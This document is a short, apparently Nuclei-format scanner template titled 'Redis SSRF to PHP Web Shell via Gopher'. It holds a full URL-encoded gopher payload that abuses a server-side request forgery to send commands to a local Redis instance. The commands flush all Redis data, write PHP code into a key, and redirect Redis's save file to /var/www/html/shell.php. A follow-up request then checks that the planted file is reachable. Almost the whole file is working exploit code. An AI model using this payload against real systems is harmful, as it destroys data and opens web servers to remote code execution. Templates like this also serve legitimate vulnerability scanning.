id: gopher-redis-php-shell-rce
info:
  name: Redis SSRF to PHP Web Shell via Gopher
  author: jakelo-ai
  severity: critical
  description: Exploit SSRF to write a PHP web shell to /var/www/html via Redis backup configuration.
  tags: ssrf,gopher,redis,rce,custom

http:
  - method: GET
    path:
      - "{{BaseURL}}/?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2425%0D%0A%0A%0A%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A%2Fvar%2Fwww%2Fhtml%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A"

  - method: GET
    path:
      - "{{BaseURL}}/shell.php"
    
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "PHP Version"
          - "Configuration File"
        condition: or
      - type: status
        status:
          - 200
